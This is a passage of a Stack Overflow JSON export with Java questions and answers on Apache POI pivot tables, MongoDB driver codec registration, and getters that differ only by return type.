{\"AAA\",\"BBB\",\"CCC\",\"DDD\",\"EEE\",\"FFF\",\"GGG\",\"HHH\"}, \n  {\"TOM\",\"DUMMY\",\"VAL\",\"1001683\",\"Description1\",\"27/04/2017\",\"CAT\",780936.58},\n {\"TOM\",\"DUMMY\",\"VAL\",\"1001695\",\"Description2\",\"27/04/2017\",\"CAT\",136.28},\n {\"HARRY\",\"DUMMY1\",\"VAL1\",\"1001692\",\"Description3\",\"03/05/2017\",\"CAT1\",191468.21},\n {\"HARRY\",\"DUMMY1\",\"VAL1\",\"1001698\",\"Description4\",\"04/05/2017\",\"CAT1\",10.11}\n  };\n\nXSSFSheet sheet = (XSSFSheet) wb.createSheet(\"data\");\nXSSFSheet pivot = (XSSFSheet) wb.createSheet(\"summary\");\nfor(Object[] dataRow : data){\n XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\n for(Object dataCell : dataRow){\n XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\nif (dataCell instanceof String) {\n cell.setCellValue((String)dataCell);\n} else if (dataCell instanceof Double) {\n cell.setCellValue((Double)dataCell);\n}\n }\n}\n\n  AreaReference areaReference = new AreaReference(\"A1:H\"+ (sheet.getLastRowNum() + 1), \n    SpreadsheetVersion.EXCEL2007);\n  XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(\"A1\"), \n  sheet);\n pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(\"AAA\");\n\nList&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\niterList.add(0);\niterList.add(1);\n iterList.add(2);\niterList.add(3);\niterList.add(4);\n iterList.add(5);\n iterList.add(6);\n\n\npivotTable.getCTPivotTableDefinition().setUpdatedVersion((short)6); \n\n for (Integer j : iterList) {\n\n\n   pivotTable.addRowLabel(j);\n   TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;();\n   for (int r = areaReference.getFirstCell().getRow()+1; r &lt; \n   areaReference.getLastCell().getRow()+1; r++) {\n   uniqueItems.add(sheet.getRow(r).getCell(j).getStringCellValue());\n  }\n  System.out.println(uniqueItems);\n  CTPivotField ctPivotField = \n  pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\n int i = 0;\n   for (String item : uniqueItems) {\n    ctPivotField.getItems().getItemArray(i).unsetT();\n   ctPivotField.getItems().getItemArray(i).setX((long)i);\n    pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields()\n  .getCacheFieldArray(j)\n   .getSharedItems().addNewS().setV(item);\n    i++;\n   }\n        ctPivotField.setDefaultSubtotal(false);\n\n\n         ctPivotField.setOutline(false);\n\n\n    if (ctPivotField.getDefaultSubtotal()) i++; \n         for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\n         ctPivotField.getItems().removeItem(k);\n        }\n       ctPivotField.getItems().setCount(i);\n\n\n           CTExtensionList extList = ctPivotField.addNewExtLst();\n        String extXML = \n       \"&lt;ext uri=\\\"{2946ED86-A175-432a-8AC1-64E0C546D7DE}\\\"\"\n       + \" xmlns:x14=\\\"http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\\\"&gt;\"\n    + \"&lt;x14:pivotField fillDownLabels=\\\"1\\\"/&gt;\"\n     + \"&lt;/ext&gt;\";\n        org.apache.xmlbeans.XmlObject xlmObject = \n     org.apache.xmlbeans.XmlObject.Factory.parse(extXML);\n          extList.set(xlmObject);\n\n     }\n\n        System.out.println(\"----end---\");\n\n       pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, \"SUM\");\n\n      FileOutputStream fileOut = new FileOutputStream(\"newoutputfile.xlsx\");\n         wb.write(fileOut);\n           fileOut.close();\n          wb.close();\n          }\n    }\n</code></pre>\n"},{"tags":["java","mongodb","codec","mongo-java-driver"],"answers":[{"tags":[],"owner":{"account_id":962967,"reputation":3773,"user_id":986903,"display_name":"jyemin"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1567344491,"creation_date":1567344491,"answer_id":57746382,"question_id":57664079,"body_markdown":"It&#39;s tricky to write correct and efficient POJO Codec implementations by hand.  In this case the problem is that the DocumentCodec that you instantiate within the CardCodec is not configured with a CodecRegistry that contains the ItemCodec, so it is unable to find the ItemCodec. \r\n\r\nThere are ways that you can fix your Codec implementations, but I&#39;m not clear why you want to roll your own when the driver has a general solution for this.  See [POJO Support][1] for details.\r\n\r\nSimply create your CodecRegistry like this:\r\n\r\n            CodecRegistry codecRegistry = CodecRegistries.fromRegistries(\r\n                MongoClientSettings.getDefaultCodecRegistry(),\r\n                CodecRegistries.fromProviders(PojoCodecProvider.builder().automatic(true).build())\r\n        );\r\n\r\n\r\n  [1]: http://mongodb.github.io/mongo-java-driver/3.11/bson/pojos/","title":"Can&#39;t find a codec for my class (CodecConfigurationException)","body":"<p>It's tricky to write correct and efficient POJO Codec implementations by hand.  In this case the problem is that the DocumentCodec that you instantiate within the CardCodec is not configured with a CodecRegistry that contains the ItemCodec, so it is unable to find the ItemCodec. </p>\n\n<p>There are ways that you can fix your Codec implementations, but I'm not clear why you want to roll your own when the driver has a general solution for this.  See <a href=\"http://mongodb.github.io/mongo-java-driver/3.11/bson/pojos/\" rel=\"nofollow noreferrer\">POJO Support</a> for details.</p>\n\n<p>Simply create your CodecRegistry like this:</p>\n\n<pre><code>        CodecRegistry codecRegistry = CodecRegistries.fromRegistries(\n            MongoClientSettings.getDefaultCodecRegistry(),\n            CodecRegistries.fromProviders(PojoCodecProvider.builder().automatic(true).build())\n    );\n</code></pre>\n"}],"owner":{"account_id":5868667,"reputation":56,"user_id":4621678,"display_name":"Tarc&#237;sio Rosa"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":13662,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640268440,"creation_date":1566848786,"question_id":57664079,"body_markdown":"I need to save a java object in mongodb database. This object has an other object into it. When I try to save, I receive the error message on console:\r\n\r\n    org.bson.codecs.configuration.CodecConfigurationException: Can&#39;t find a codec for class Item.\r\n\r\nThe problem is that I created the codec for class Item, but, it can&#39;t work even registering it. See the classes for best understanding.\r\n\r\n\r\n\r\nModels\r\n\r\n```\r\npublic class Card(){\r\n\r\n  public Card(){\r\n   itens = new ArrayList&lt;Item&gt;()\r\n  }\r\n  String id;\r\n  String description;\r\n  List&lt;Item&gt; itens;\r\n  .\r\n  .\r\n  .\r\n\r\n}\r\n```\r\n```\r\npublic class Item(){\r\n\r\n  String id;\r\n  String name; \r\n  .\r\n  .\r\n  .\r\n\r\n}\r\n```\r\nCardCodec\r\n\r\n```\r\npublic class CardCodec implements CollectibleCodec&lt;Card&gt;{\r\n  private final Codec&lt;Document&gt; documentCodec;\r\n\r\n  public CardCodec() {\t\t\r\n    this.documentCodec = new DocumentCodec();\r\n  }\r\n\r\n  @Override\r\n  public void encode(BsonWriter writer, Card card, EncoderContext encoderContext) {\r\n  Document cardDoc = new Document();\r\n    String id = card.getId();\r\n    String description = card.getDescription();  \r\n    List&lt;Item&gt; itens = card.getItens();\r\n\r\n    if(id != null) {\r\n        cardDoc.put(&quot;_id&quot;, new ObjectId(id));\r\n    }\r\n    if(description != null){\r\n        cardDoc.put(&quot;description&quot;, card.getDescription);\r\n    }\r\n    if(Itens != null){\r\n        cardDoc.put(&quot;itens&quot;, card.getItens());\r\n    }\r\n    this.documentCodec.encode(writer, cardDoc, encoderContext);\r\n  }\r\n\r\n    @Override\r\n    public Class&lt;Card&gt; getEncoderClass() {\t\t\r\n        return Card.class;\r\n    }\r\n\r\n    @Override\r\n    public Card decode(BsonReader reader, DecoderContext decoderContext) {\r\n        Document cardDoc = this.documentCodec.decode(reader, decoderContext);\r\n        Card card=  new Card();\r\n\r\n        card.setId(cardDoc .getObjectId(&quot;_id&quot;).toHexString());\r\n        card.setDescription(cardDoc .getString(&quot;description&quot;));\r\n\r\n        List&lt;Document&gt; itensDoc =  cardDoc.getList(&quot;itens&quot;, Document.class);\r\n        List&lt;Item&gt; itens = new ItemConverter().convertToListItem(itensDoc);\r\n        card.setItens(itens);\r\n        return card;\r\n    }\r\n\r\n    @Override\r\n    public Card generateIdIfAbsentFromDocument(Card card) {\r\n\t\r\n        if( !documentHasId(card) ) {\r\n\t    card.setId(new ObjectId().toHexString());\r\n        }\r\n\t\t\r\n        return card;\r\n\t\t\r\n    }\r\n\r\n    @Override\r\n    public boolean documentHasId(Card card) {\t\t\r\n        return null != card.getId();\r\n    }\r\n\r\n    @Override\r\n    public BsonValue getDocumentId(Card card) {\r\n        if(!documentHasId(card)) {\r\n            throw new IllegalStateException(&quot;Esse documento n&#227;o tem um _id&quot;);\r\n        }\r\n        return new BsonString(card.getId());\r\n    }\r\n\r\n}\r\n```\r\nConverter\r\n```\r\npublic class ItemConverter {\r\n\r\n\tpublic Item convert(Document doc) {\r\n\t\tItem item = new Item();\r\n\t\tString id = doc.getObjectId(&quot;_id&quot;).toHexString();\r\n\t\tString description = doc.getString(&quot;description&quot;);\r\n\t\titem.setId(id);\r\n\t\titem.setName(description);\r\n\t\treturn item;\r\n\t}\r\n\r\n    public List&lt;Item&gt; convertToListItem(List&lt;Document&gt; ItensDocs){\t\t\r\n        List&lt;Item&gt; itens = new ArrayList&lt;Item&gt;();\t\r\n        if(ItensDocs== null) {\r\n           return Collections.emptyList();\r\n        }\r\n        for(Document doc: ItensDocs) {\t\t\t \r\n           itens.add( this.convert(doc) );\r\n        }\r\n        return itens;\r\n    }\r\n\r\n}\r\n```\r\nItemCodec\r\n```\r\npublic class ItemCodec implements CollectibleCodec&lt;Item&gt;{\r\n    private final Codec&lt;Document&gt; documentCodec;\r\n\t\r\n    public ItemCodec() {\t\r\n        this.documentCodec = new DocumentCodec();\r\n    }\r\n\r\n    @Override\r\n    public void encode(BsonWriter writer, Item value, EncoderContext encoderContext) {\r\n        Document itemDoc = new Document();\r\n\t\t\r\n        String id = value.getId();\r\n        String name = value.getName();\r\n\r\n        if(id != null) {\r\n            itemDoc.put(&quot;_id&quot;, new ObjectId(id));\r\n        }\r\n        if(name != null) {\r\n            itemDoc.put(&quot;name&quot;, value.getName());\r\n        }\r\n\r\n        documentCodec.encode(writer, itemDoc, encoderContext);\r\n    }\r\n\r\n    @Override\r\n    public Class&lt;Item&gt; getEncoderClass() {\t\t\r\n        return Item.class;\r\n    }\r\n\r\n    @Override\r\n    public Item decode(BsonReader reader, DecoderContext decoderContext) {\t\t\r\n        Document document = documentCodec.decode(reader, decoderContext);\t\t\r\n        return new ItemConverter().convert(document);\r\n    }\r\n\r\n    @Override\r\n    public Item generateIdIfAbsentFromDocument(Item item) {\r\n        if(!this.documentHasId(item)) {\r\n            item.setId(new ObjectId().toHexString());\t\t\t\r\n        }\r\n        return item;\t\t\r\n    }\r\n\r\n    @Override\r\n    public boolean documentHasId(Item item) {\t\t\r\n        return null != item.getId();\r\n    }\r\n\r\n    @Override\r\n    public BsonValue getDocumentId(Item item) {\r\n        if(!documentHasId(item)) {\r\n            throw new IllegalStateException(&quot;Esse documento n&#227;o tem um _id&quot;);\r\n        }\r\n\t\r\n        return new BsonString(item.getId());\r\n\t\t\r\n    }\r\n\r\n\r\n}\r\n```\r\n\r\nNow, how I registry the codecs\r\n```\r\n...\r\n    CardCodec cardCodec = new CardCodec();\r\n    ItemCodec itemCodec = new ItemCodec();\r\n  \r\n    this.codecRegistry = CodecRegistries.fromRegistries(\r\n\t\t\t\tMongoClientSettings.getDefaultCodecRegistry(),\r\n\t\t\t\tCodecRegistries.fromCodecs(cardCodec, itemCodec)\r\n    );\r\n\r\nthis.cardCollection = this.mongoDatabase.getCollection(&quot;cards&quot;, Card.class).withCodecRegistry(this.codecRegistry);\r\n...\r\n```\r\n\r\nWhen I try to execute an insert:\r\n\r\n    this.cardCollection.insertOne(card);\r\n\r\nI receive: \r\n\r\n    org.bson.codecs.configuration.CodecConfigurationException","title":"Can&#39;t find a codec for my class (CodecConfigurationException)","body":"<p>I need to save a java object in mongodb database. This object has an other object into it. When I try to save, I receive the error message on console:</p>\n\n<pre><code>org.bson.codecs.configuration.CodecConfigurationException: Can't find a codec for class Item.\n</code></pre>\n\n<p>The problem is that I created the codec for class Item, but, it can't work even registering it. See the classes for best understanding.</p>\n\n<p>Models</p>\n\n<pre><code>public class Card(){\n\n  public Card(){\n   itens = new ArrayList&lt;Item&gt;()\n  }\n  String id;\n  String description;\n  List&lt;Item&gt; itens;\n  .\n  .\n  .\n\n}\n</code></pre>\n\n<pre><code>public class Item(){\n\n  String id;\n  String name; \n  .\n  .\n  .\n\n}\n</code></pre>\n\n<p>CardCodec</p>\n\n<pre><code>public class CardCodec implements CollectibleCodec&lt;Card&gt;{\n  private final Codec&lt;Document&gt; documentCodec;\n\n  public CardCodec() {      \n    this.documentCodec = new DocumentCodec();\n  }\n\n  @Override\n  public void encode(BsonWriter writer, Card card, EncoderContext encoderContext) {\n  Document cardDoc = new Document();\n    String id = card.getId();\n    String description = card.getDescription();  \n    List&lt;Item&gt; itens = card.getItens();\n\n    if(id != null) {\n        cardDoc.put(\"_id\", new ObjectId(id));\n    }\n    if(description != null){\n        cardDoc.put(\"description\", card.getDescription);\n    }\n    if(Itens != null){\n        cardDoc.put(\"itens\", card.getItens());\n    }\n    this.documentCodec.encode(writer, cardDoc, encoderContext);\n  }\n\n    @Override\n    public Class&lt;Card&gt; getEncoderClass() {      \n        return Card.class;\n    }\n\n    @Override\n    public Card decode(BsonReader reader, DecoderContext decoderContext) {\n        Document cardDoc = this.documentCodec.decode(reader, decoderContext);\n        Card card=  new Card();\n\n        card.setId(cardDoc .getObjectId(\"_id\").toHexString());\n        card.setDescription(cardDoc .getString(\"description\"));\n\n        List&lt;Document&gt; itensDoc =  cardDoc.getList(\"itens\", Document.class);\n        List&lt;Item&gt; itens = new ItemConverter().convertToListItem(itensDoc);\n        card.setItens(itens);\n        return card;\n    }\n\n    @Override\n    public Card generateIdIfAbsentFromDocument(Card card) {\n\n        if( !documentHasId(card) ) {\n        card.setId(new ObjectId().toHexString());\n        }\n\n        return card;\n\n    }\n\n    @Override\n    public boolean documentHasId(Card card) {       \n        return null != card.getId();\n    }\n\n    @Override\n    public BsonValue getDocumentId(Card card) {\n        if(!documentHasId(card)) {\n            throw new IllegalStateException(\"Esse documento no tem um _id\");\n        }\n        return new BsonString(card.getId());\n    }\n\n}\n</code></pre>\n\n<p>Converter</p>\n\n<pre><code>public class ItemConverter {\n\n    public Item convert(Document doc) {\n        Item item = new Item();\n        String id = doc.getObjectId(\"_id\").toHexString();\n        String description = doc.getString(\"description\");\n        item.setId(id);\n        item.setName(description);\n        return item;\n    }\n\n    public List&lt;Item&gt; convertToListItem(List&lt;Document&gt; ItensDocs){      \n        List&lt;Item&gt; itens = new ArrayList&lt;Item&gt;();   \n        if(ItensDocs== null) {\n           return Collections.emptyList();\n        }\n        for(Document doc: ItensDocs) {           \n           itens.add( this.convert(doc) );\n        }\n        return itens;\n    }\n\n}\n</code></pre>\n\n<p>ItemCodec</p>\n\n<pre><code>public class ItemCodec implements CollectibleCodec&lt;Item&gt;{\n    private final Codec&lt;Document&gt; documentCodec;\n\n    public ItemCodec() {    \n        this.documentCodec = new DocumentCodec();\n    }\n\n    @Override\n    public void encode(BsonWriter writer, Item value, EncoderContext encoderContext) {\n        Document itemDoc = new Document();\n\n        String id = value.getId();\n        String name = value.getName();\n\n        if(id != null) {\n            itemDoc.put(\"_id\", new ObjectId(id));\n        }\n        if(name != null) {\n            itemDoc.put(\"name\", value.getName());\n        }\n\n        documentCodec.encode(writer, itemDoc, encoderContext);\n    }\n\n    @Override\n    public Class&lt;Item&gt; getEncoderClass() {      \n        return Item.class;\n    }\n\n    @Override\n    public Item decode(BsonReader reader, DecoderContext decoderContext) {      \n        Document document = documentCodec.decode(reader, decoderContext);       \n        return new ItemConverter().convert(document);\n    }\n\n    @Override\n    public Item generateIdIfAbsentFromDocument(Item item) {\n        if(!this.documentHasId(item)) {\n            item.setId(new ObjectId().toHexString());           \n        }\n        return item;        \n    }\n\n    @Override\n    public boolean documentHasId(Item item) {       \n        return null != item.getId();\n    }\n\n    @Override\n    public BsonValue getDocumentId(Item item) {\n        if(!documentHasId(item)) {\n            throw new IllegalStateException(\"Esse documento no tem um _id\");\n        }\n\n        return new BsonString(item.getId());\n\n    }\n\n\n}\n</code></pre>\n\n<p>Now, how I registry the codecs</p>\n\n<pre><code>...\n    CardCodec cardCodec = new CardCodec();\n    ItemCodec itemCodec = new ItemCodec();\n\n    this.codecRegistry = CodecRegistries.fromRegistries(\n                MongoClientSettings.getDefaultCodecRegistry(),\n                CodecRegistries.fromCodecs(cardCodec, itemCodec)\n    );\n\nthis.cardCollection = this.mongoDatabase.getCollection(\"cards\", Card.class).withCodecRegistry(this.codecRegistry);\n...\n</code></pre>\n\n<p>When I try to execute an insert:</p>\n\n<pre><code>this.cardCollection.insertOne(card);\n</code></pre>\n\n<p>I receive: </p>\n\n<pre><code>org.bson.codecs.configuration.CodecConfigurationException\n</code></pre>\n"},{"tags":["java","methods"],"comments":[{"owner":{"account_id":9725613,"reputation":53334,"user_id":7212686,"accept_rate":100,"display_name":"azro"},"score":0,"creation_date":1637487688,"post_id":70053325,"comment_id":123834818,"body_markdown":"`getCompo` and `getSimp` ? `getPieceCompo` and `getPieceSimp` ? That doesn&#39;t seem to be a hard problem","body":"<code>getCompo</code> and <code>getSimp</code> ? <code>getPieceCompo</code> and <code>getPieceSimp</code> ? That doesn&#39;t seem to be a hard problem"},{"owner":{"account_id":5281408,"reputation":18797,"user_id":4216641,"display_name":"Turing85"},"score":1,"creation_date":1637487701,"post_id":70053325,"comment_id":123834821,"body_markdown":"This is not posssible in Java. The return type is not part of the method signature. Therefore, we cannot have two method with same name and same (in this case: empty) parameter list, but different return types.","body":"This is not posssible in Java. The return type is not part of the method signature. Therefore, we cannot have two method with same name and same (in this case: empty) parameter list, but different return types."}],"answers":[{"tags":[],"owner":{"account_id":5281408,"reputation":18797,"user_id":4216641,"display_name":"Turing85"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1640268430,"creation_date":1637488209,"answer_id":70053402,"question_id":70053325,"body_markdown":"As per [JLS, &#167;8.4.2][JLS_8_4_2]:\r\n\r\n&gt; ...\r\n&gt;\r\n&gt; The signature of a method `m1` is a subsignature of the signature of a method `m2` if either:\r\n&gt;\r\n&gt; - `m2` has the same signature as `m1`, or\r\n&gt; - the signature of `m1` is the same as the erasure ([&#167;4.6][JLS_4_6]) of the signature of `m2`.\r\n&gt;\r\n&gt; Two method signatures `m1` and `m2` are *override-equivalent* iff either `m1` is a subsignature of `m2` or `m2` is a subsignature of `m1`.\r\n&gt;\r\n&gt; **It is a compile-time error to declare two methods with override-equivalent signatures in a class.**\r\n&gt;\r\n&gt; ...\r\n\r\nThis means that methods `public Composee getPiece()` and `Simple getPiece()` are override-equivalent. Since those two methods are in the same class, the compiler generates a compile-time error.\r\n\r\nAs was pointed out by [azro][azro] in the [comments][azroComment], we can instead write two separate getters `Composee getComposee()` and `Simple getSimple()`.\r\n\r\nIf `Simple` and `Composee` have a common supertype (e.g. `Piece`), we can write `Piece getPiece()` instead.\r\n\r\n\r\n[JLS_8_4_2]: https://docs.oracle.com/javase/specs/jls/se17/html/jls-8.html#jls-8.4.2\r\n[JLS_4_6]: https://docs.oracle.com/javase/specs/jls/se17/html/jls-4.html#jls-4.6\r\n[azro]: https://stackoverflow.com/users/7212686/azro\r\n[azroComment]: https://stackoverflow.com/questions/70053325/same-java-getter-for-different-types#comment123834818_70053325","title":"Same java getter for different types","body":"<p>As per <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-8.html#jls-8.4.2\" rel=\"nofollow noreferrer\">JLS, 8.4.2</a>:</p>\n<blockquote>\n<p>...</p>\n<p>The signature of a method <code>m1</code> is a subsignature of the signature of a method <code>m2</code> if either:</p>\n<ul>\n<li><code>m2</code> has the same signature as <code>m1</code>, or</li>\n<li>the signature of <code>m1</code> is the same as the erasure (<a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-4.html#jls-4.6\" rel=\"nofollow noreferrer\">4.6</a>) of the signature of <code>m2</code>.</li>\n</ul>\n<p>Two method signatures <code>m1</code> and <code>m2</code> are <em>override-equivalent</em> iff either <code>m1</code> is a subsignature of <code>m2</code> or <code>m2</code> is a subsignature of <code>m1</code>.</p>\n<p><strong>It is a compile-time error to declare two methods with override-equivalent signatures in a class.</strong></p>\n<p>...</p>\n</blockquote>\n<p>This means that methods <code>public Composee getPiece()</code> and <code>Simple getPiece()</code> are override-equivalent. Since those two methods are in the same class, the compiler generates a compile-time error.</p>\n<p>As was pointed out by <a href=\"https://stackoverflow.com/users/7212686/azro\">azro</a> in the <a href=\"https://stackoverflow.com/questions/70053325/same-java-getter-for-different-types#comment123834818_70053325\">comments</a>, we can instead write two separate getters <code>Composee getComposee()</code> and <code>Simple getSimple()</code>.</p>\n<p>If <code>Simple</code> and <code>Composee</code> have a common supertype (e.g. <code>Piece</code>), we can write <code>Piece getPiece()</code> instead.</p>\n"},{"tags":[],"owner":{"account_id":20034051,"reputation":11,"user_id":14686188,"display_name":"Necrosis"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1637490471,"creation_date":1637490471,"answer_id":70053668,"question_id":70053325,"body_markdown":"Try this maybe:\r\n\r\n    public class Composant&lt;T&gt;{\r\n        private final int quantite;\r\n        private final T comp;\r\n\r\n        public Composant(T comp,int quantite) throws BadTypeException {\r\n            if(!(comp instanceof Composee) || !(comp instanceof Simple)) throw new BadTypeException(&quot;Can&#39;t create Composant with \\&quot;&quot; + comp.getClass().getName() + &quot;\\&quot; type object!&quot;);\r\n            this.comp = comp;\r\n            this.quantite = quantite;\r\n        }\r\n\r\n        public T getPiece(){\r\n            return this.comp;\r\n        }\r\n\r\n        public int getQuantite(){\r\n            return this.quantite;\r\n        }\r\n    }\r\n\r\nException is:\r\n\r\n    //  If you don&#39;t want to catch exception, change it to &quot;RuntimeException&quot;\r\n    class BadTypeException extends Exception{\r\n        public BadTypeException(String message){\r\n            super(message);\r\n        }\r\n    }\r\n\r\n\r\nAnd create like this:\r\n\r\n        try {\r\n            new Composant&lt;Composee&gt;(new Composee(),4);\r\n        } catch (BadTypeException e) {\r\n            e.printStackTrace();\r\n        }","title":"Same java getter for different types","body":"<p>Try this maybe:</p>\n<pre><code>public class Composant&lt;T&gt;{\n    private final int quantite;\n    private final T comp;\n\n    public Composant(T comp,int quantite) throws BadTypeException {\n        if(!(comp instanceof Composee) || !(comp instanceof Simple)) throw new BadTypeException(&quot;Can't create Composant with \\&quot;&quot; + comp.getClass().getName() + &quot;\\&quot; type object!&quot;);\n        this.comp = comp;\n        this.quantite = quantite;\n    }\n\n    public T getPiece(){\n        return this.comp;\n    }\n\n    public int getQuantite(){\n        return this.quantite;\n    }\n}\n</code></pre>\n<p>Exception is:</p>\n<pre><code>//  If you don't want to catch exception, change it to &quot;RuntimeException&quot;\nclass BadTypeException extends Exception{\n    public BadTypeException(String message){\n        super(message);\n    }\n}\n</code></pre>\n<p>And create like this:</p>\n<pre><code>    try {\n        new Composant&lt;Composee&gt;(new Composee(),4);\n    } catch (BadTypeException e) {\n        e.printStackTrace();\n    }\n</code></pre>\n"}],"owner":{"display_name":"user13911186"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":271,"favorite_count":0,"down_vote_count":3,"up_vote_count":0,"answer_count":2,"score":-3,"last_activity_date":1640268430,"creation_date":1637487497,"question_id":70053325,"body_markdown":"I need to write a java method to get specific information from an object. However, the object can either be of type A or of type B. Here is the part of my code :\r\n\r\n    class Composant{\r\n\r\n    int quantit&#233;;\r\n    static Composee pieceCompo;\r\n    static Simple pieceSimp;\r\n\r\n    public Composant(Composee piece, int nombre){\r\n        pieceCompo = piece;\r\n        quantit&#233; = nombre;\r\n    }\r\n\r\n    public Composant(Simple piece, int nombre){\r\n        pieceSimp = piece;\r\n        quantit&#233; = nombre;\r\n    }\r\n    public Composee getPiece(){\r\n        return pieceCompo;\r\n    }\r\n    public Simple getPiece(){\r\n        return pieceSimp;\r\n    }\r\n    public int getQuantite(){\r\n        return quantit&#233;;\r\n    }}\r\n\r\n\r\nWhen I write it like that it raises an error saying &quot;Duplicate method&quot;. How can I get this to work?","title":"Same java getter for different types","body":"<p>I need to write a java method to get specific information from an object. However, the object can either be of type A or of type B. Here is the part of my code :</p>\n<pre><code>class Composant{\n\nint quantit;\nstatic Composee pieceCompo;\nstatic Simple pieceSimp;\n\npublic Composant(Composee piece, int nombre){\n    pieceCompo = piece;\n    quantit = nombre;\n}\n\npublic Composant(Simple piece, int nombre){\n    pieceSimp = piece;\n    quantit = nombre;\n}\npublic Composee getPiece(){\n    return pieceCompo;\n}\npublic Simple getPiece(){\n    return pieceSimp;\n}\npublic int getQuantite(){\n    return quantit;\n}}\n</code></pre>\n<p>When I write it like that it raises an error saying &quot;Duplicate method&quot;. How can I get this to work?</p>\n"},{"tags":["java","excel","apache-poi","pivot-table"],"answers":[{"tags":[],"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1640268277,"creation_date":1585332105,"answer_id":60891686,"question_id":60887605,"body_markdown":"`Apache poi` has only rudimentary support for creating pivot tables. It only creates default pivot tables but is not able creating special settings without falling back to the underlying `ooxml-schemas` classes.\r\n\r\nFor your data source the following code creates what `apache poi` supports by default:\r\n\r\n    import java.io.FileOutputStream;\r\n    import java.io.FileInputStream;\r\n    \r\n    import org.apache.poi.ss.SpreadsheetVersion;\r\n    import org.apache.poi.ss.util.AreaReference;\r\n    import org.apache.poi.ss.util.CellReference;\r\n    import org.apache.poi.xssf.usermodel.*;\r\n    \r\n    class CreatePivotTableDefault {\r\n    \r\n     public static void main(String[] args) throws Exception {\r\n    \r\n      try (XSSFWorkbook workbook = new XSSFWorkbook(new FileInputStream(&quot;ExcelSource.xlsx&quot;)); \r\n           FileOutputStream fileout = new FileOutputStream(&quot;ExcelResult.xlsx&quot;) ) {\r\n    \r\n       XSSFSheet dataSheet = workbook.getSheetAt(0);\r\n       XSSFSheet pivotSheet = workbook.createSheet(&quot;Pivot&quot;);\r\n    \r\n       AreaReference areaReference = new AreaReference(&quot;A1:D5&quot;, SpreadsheetVersion.EXCEL2007);\r\n    \r\n       XSSFPivotTable pivotTable = pivotSheet.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), dataSheet);\r\n    \r\n       pivotTable.addRowLabel(2);\r\n       pivotTable.addRowLabel(3);\r\n       pivotTable.addRowLabel(0);\r\n       pivotTable.addRowLabel(1);\r\n    \r\n       workbook.write(fileout);\r\n    \r\n      }\r\n    \r\n     }\r\n    }\r\n\r\nThis creates a pivot table in outline format, which is the default.\r\n\r\nIf you wants creating a pivot table which is not in outline format and is not showing subtotals for each field, we need using the underlying `ooxml-schemas` classes. We need creating the correct pivot table field items. And we need to build a cache definition which has shared elements for those items. See also https://stackoverflow.com/questions/37305976/apache-poi-xssfpivottable-setdefaultsubtotal/40480654#40480654.\r\n\r\nThe following code should create the pivot table you wants from your data source:\r\n\r\n    import java.io.FileOutputStream;\r\n    import java.io.FileInputStream;\r\n    \r\n    import org.apache.poi.ss.SpreadsheetVersion;\r\n    import org.apache.poi.ss.util.AreaReference;\r\n    import org.apache.poi.ss.util.CellReference;\r\n    import org.openxmlformats.schemas.spreadsheetml.x2006.main.CTPivotField;\r\n    import org.apache.poi.ss.usermodel.DataFormatter;\r\n    import org.apache.poi.xssf.usermodel.*;\r\n    \r\n    class CreatePivotTable {\r\n    \r\n     static void addRowLabel(XSSFPivotTable pivotTable, XSSFSheet dataSheet, AreaReference areaReference, int column) { \r\n    \r\n      DataFormatter formatter = new DataFormatter(java.util.Locale.US);\r\n      //create row label - apache poi creates as much fields for each as rows are in the pivot table data range\r\n      pivotTable.addRowLabel(column);\r\n    \r\n      //determine unique labels in column\r\n      java.util.TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\r\n      for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\r\n       uniqueItems.add(formatter.formatCellValue(dataSheet.getRow(r).getCell(column)));\r\n      }\r\n      //System.out.println(uniqueItems);\r\n    \r\n      //build pivot table and cache\r\n      CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(column);\r\n      int i = 0;\r\n      for (String item : uniqueItems) {\r\n       //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;\r\n       ctPivotField.getItems().getItemArray(i).unsetT();\r\n       ctPivotField.getItems().getItemArray(i).setX((long)i);\r\n       //build a cache definition which has shared elements for those items \r\n       pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(column)\r\n        .getSharedItems().addNewS().setV(item);\r\n       i++;\r\n      }\r\n    \r\n      //set pivot field settings\r\n      ctPivotField.setOutline(false); // no outline format\r\n      ctPivotField.setDefaultSubtotal(false); // no subtotals for this field\r\n    \r\n      //remove further items\r\n      if (ctPivotField.getDefaultSubtotal()) i++; //let one default item be if there shall be subtotals\r\n      for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\r\n       ctPivotField.getItems().removeItem(k);\r\n      }\r\n      ctPivotField.getItems().setCount(i);\r\n    \r\n     }\r\n    \r\n     public static void main(String[] args) 